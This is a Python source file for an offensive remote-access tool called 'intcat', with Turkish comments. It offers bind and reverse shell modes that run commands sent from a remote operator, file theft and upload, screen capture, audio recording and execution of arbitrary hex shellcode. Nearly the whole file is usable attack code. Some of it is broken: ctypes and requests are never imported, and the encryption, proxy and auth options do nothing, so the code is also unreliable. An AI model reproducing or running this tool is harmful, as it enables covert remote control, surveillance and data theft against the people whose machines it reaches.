#!/usr/bin/env python3 
import socket
import subprocess
import os
import sys
import argparse
import threading
from PIL import ImageGrab
import wave
import contextlib

def capture_photo(filename):
    # Ekran görüntüsü almak için PIL kullanılacak
    image = ImageGrab.grab()
    image.save(filename)
    print(f"Photo saved as {filename}.")

def record_audio(filename, duration=5):
    import time
    import wave
    import subprocess

    # Ses kaydı yapmak için Android için uygun bir yöntem bulunamadı.
    # Bu örnek `ffmpeg` kullanarak ses kaydeder. Android üzerinde çalıştırabilirsiniz.
    command = f"ffmpeg -f alsa -t {duration} -i default {filename}"
    subprocess.run(command, shell=True)
    print(f"Audio recorded and saved as {filename}.")

def handle_client(client_socket, verbose, log_file, encryption, user_agent, proxy, auth):
    if log_file:
        log = open(log_file, 'a')

    while True:
        try:
            command = client_socket.recv(1024).decode()
            if command.lower() == 'exit':
                break

            if command.startswith('cd '):
                try:
                    os.chdir(command.strip('cd '))
                    client_socket.send(b'Changed directory')
                except FileNotFoundError as e:
                    client_socket.send(str(e).encode())
            
            elif command.startswith('photo '):
                filename = command.split(' ')[1]
                capture_photo(filename)
                client_socket.send(b'Photo captured')

            elif command.startswith('record '):
                filename, duration = command.split(' ')[1], int(command.split(' ')[2])
                record_audio(filename, duration)
                client_socket.send(b'Audio recorded')

            elif command.startswith('get '):
                filename = command.split(' ')[1]
                try:
                    with open(filename, 'rb') as f:
                        client_socket.sendall(f.read())
                except FileNotFoundError as e:
                    client_socket.send(str(e).encode())
            
            elif command.startswith('put '):
                filename = command.split(' ')[1]
                with open(filename, 'wb') as f:
                    while True:
                        data = client_socket.recv(1024)
                        if not data:
                            break
                        f.write(data)
                client_socket.send(b'File uploaded')
            
            else:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                client_socket.send(output)
            
            if verbose:
                print(f"Executed command: {command}")
                if log_file:
                    log.write(f"Executed command: {command}\n")
        except Exception as e:
            client_socket.send(str(e).encode())
            if verbose:
                print(f"Error: {str(e)}")
            if log_file:
                log.write(f"Error: {str(e)}\n")

    if log_file:
        log.close()

def bind_shell(host, port, verbose, log_file, encryption, user_agent, proxy, auth):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    print(f"[*] Listening on {host}:{port}")

    client_socket, _ = server_socket.accept()
    print("[*] Connection accepted")

    handle_client(client_socket, verbose, log_file, encryption, user_agent, proxy, auth)

    client_socket.close()
    server_socket.close()

def reverse_shell(host, port, verbose, log_file, encryption, user_agent, proxy, auth):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client_socket.settimeout(timeout)  # Setting connection timeout
        client_socket.connect((host, port))
        print(f"[*] Connected to {host}:{port}")
    except socket.timeout:
        print(f"[!] Connection to {host}:{port} timed out.")
        return
    
    handle_client(client_socket, verbose, log_file, encryption, user_agent, proxy, auth)
    
    client_socket.close()

def run_shellcode(shellcode):
    shellcode_bytes = bytes.fromhex(shellcode)
    shellcode_buffer = ctypes.create_string_buffer(shellcode_bytes)
    shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(None))
    shellcode_func()

def meterpreter_shell(host, port, verbose, log_file, encryption, user_agent, proxy, auth):
    reverse_shell(host, port, verbose, log_file, encryption, user_agent, proxy, auth)

def perform_http_request(url, method='GET', headers=None, data=None, timeout=30):
    try:
        response = requests.request(method, url, headers=headers, data=data, timeout=timeout)
        return response.text
    except requests.exceptions.RequestException as e:
        return str(e)

def main():
    parser = argparse.ArgumentParser(prog="intcat", description="intcat")
    parser.add_argument('mode', choices=['bind', 'reverse', 'shellcode', 'meterpreter', 'photo', 'record'], help="Mode to run")
    parser.add_argument('host', help="Host to connect to or bind to")
    parser.add_argument('port', type=int, help="Port number")
    parser.add_argument('--shellcode', help="Hexadecimal shellcode to execute (for shellcode mode)", default=None)
    parser.add_argument('--photo', help="Filename for capturing photo (for photo mode)", default=None)
    parser.add_argument('--record', help="Filename for recording audio (for record mode)", default=None)
    parser.add_argument('--duration', type=int, help="Duration for recording audio in seconds (for record mode)", default=5)
    parser.add_argument('--timeout', type=int, help="Connection timeout in seconds", default=30)
    parser.add_argument('--verbose', action='store_true', help="Enable verbose output")
    parser.add_argument('--port_range', type=str, help="Port range to scan (format: start-end)", default=None)
    parser.add_argument('--retry', type=int, help="Number of retry attempts for connection", default=3)
    parser.add_argument('--log', help="File to log output", default=None)
    parser.add_argument('--user_agent', help="Custom User-Agent string for HTTP requests", default=None)
    parser.add_argument('--proxy', help="Proxy server to use (format: host:port)", default=None)
    parser.add_argument('--auth', help="Authorization credentials (format: user:password)", default=None)
    parser.add_argument('--encryption', choices=['none', 'ssl', 'tls'], help="Encryption type for the connection", default='none')

    args = parser.parse_args()

    global timeout
    timeout = args.timeout

    if args.verbose:
        print(f"Mode: {args.mode}")
        print(f"Host: {args.host}")
        print(f"Port: {args.port}")
        print(f"Timeout: {args.timeout}")
        print(f"Log file: {args.log}")
        print(f"User-Agent: {args.user_agent}")
        print(f"Proxy: {args.proxy}")
        print(f"Authorization: {args.auth}")
        print(f"Encryption: {args.encryption}")

    if args.mode == 'bind':
        bind_shell(args.host, args.port, args.verbose, args.log, args.encryption, args.user_agent, args.proxy, args.auth)
    elif args.mode == 'reverse':
        reverse_shell(args.host, args.port, args.verbose, args.log, args.encryption, args.user_agent, args.proxy, args.auth)
    elif args.mode == 'shellcode':
        if args.shellcode is None:
            print("Shellcode must be provided for shellcode mode")
            sys.exit(1)
        run_shellcode(args.shellcode)
    elif args.mode == 'meterpreter':
        meterpreter_shell(args.host, args.port, args.verbose, args.log, args.encryption, args.user_agent, args.proxy, args.auth)
    elif args.mode == 'photo':
        if args.photo is None:
            print("Filename must be provided for photo mode")
            sys.exit(1)
        capture_photo(args.photo)
    elif args.mode == 'record':
        if args.record is None:
            print("Filename must be provided for audio record mode")
            sys.exit(1)
        record_audio(args.record, args.duration)
    else:
        print("Invalid mode. Choose from: bind, reverse, shellcode, meterpreter, photo, record")
        sys.exit(1)

if __name__ == "__main__":
    main()